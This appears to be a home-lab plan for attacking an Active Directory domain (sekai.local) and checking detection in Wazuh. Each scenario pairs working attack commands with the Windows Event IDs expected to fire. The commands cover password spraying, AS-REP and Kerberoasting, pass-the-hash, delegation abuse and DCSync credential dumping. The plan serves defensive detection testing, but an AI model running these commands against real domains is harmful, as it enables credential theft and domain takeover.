# Phase 4 — Attack & Detect

## Goal
Perform AD attacks from PC B against sekai.local, document each attack, and verify detection in Wazuh.

## Rules
- Always revert to CLEAN snapshot before starting a new attack scenario
- Document every command used
- Screenshot Wazuh alerts for each attack
- Note which Event IDs triggered

---

## Attack Scenarios

### 1. Password Spraying
**Attack:**
```bash
netexec smb 10.10.10.10 -u users.txt -p 'Winter2024!' --continue-on-success
```
**Detection:** Event ID 4625 (multiple failed logons from same source)
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

### 2. ASREPRoasting
**Attack:**
```bash
impacket-GetNPUsers sekai.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```
**Detection:** Event ID 4768 with no pre-auth
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

### 3. Kerberoasting
**Attack:**
```bash
impacket-GetUserSPNs sekai.local/john.doe:'Password123!' -dc-ip 10.10.10.10 -request
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```
**Detection:** Event ID 4769 with RC4 encryption
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

### 4. BloodHound Enumeration
**Attack:**
```bash
bloodhound-python -u john.doe -p 'Password123!' -d sekai.local -dc dc01.sekai.local -ns 10.10.10.10 -c all
```
**Detection:** High volume LDAP queries, Event ID 4662
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

### 5. ACL Abuse — ForceChangePassword
**Attack:**
```bash
bloodyAD -u jane.smith -p 'Password123!' -d sekai.local --host 10.10.10.10 set password sarah.lee 'Hacked123!'
```
**Detection:** Event ID 4723/4724 (password change)
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

### 6. Constrained Delegation Abuse (S4U2self + S4U2proxy)
**Attack:**
```bash
impacket-getST sekai.local/svc_sql:'Password123!' -dc-ip 10.10.10.10 -spn cifs/dc01.sekai.local -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass dc01.sekai.local
```
**Detection:** Event ID 4769 (unusual service ticket), Event ID 4662 (DCSync replication)
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

### 7. Pass-the-Hash
**Attack:**
```bash
evil-winrm -i 10.10.10.10 -u Administrator -H <NTHASH>
```
**Detection:** Event ID 4624 logon type 3 with NTLM
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

### 8. DCSync
**Attack:**
```bash
impacket-secretsdump sekai.local/Administrator:'Password123!'@10.10.10.10 -just-dc-ntlm
```
**Detection:** Event ID 4662 with replication GUIDs
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

### 9. Credential Hunting in Shares
**Attack:**
```bash
netexec smb 10.10.10.10 -u john.doe -p 'Password123!' --shares
netexec smb 10.10.10.10 -u john.doe -p 'Password123!' -M spider_plus
```
**Detection:** Event ID 5140 (share access), 4663 (file access)
- [ ] Attack performed
- [ ] Detected in Wazuh: YES / NO
- [ ] Screenshot saved

---

## Documentation Template (per attack)

```
## Attack: [Name]
**Date:** 
**Objective:** 
**Tools Used:** 
**Commands:**

**Result:** 
**Evidence:** [screenshot]

**Detection:**
- Wazuh Alert: YES/NO
- Event IDs Triggered: 
- Alert Screenshot: [screenshot]

**Remediation:**
```
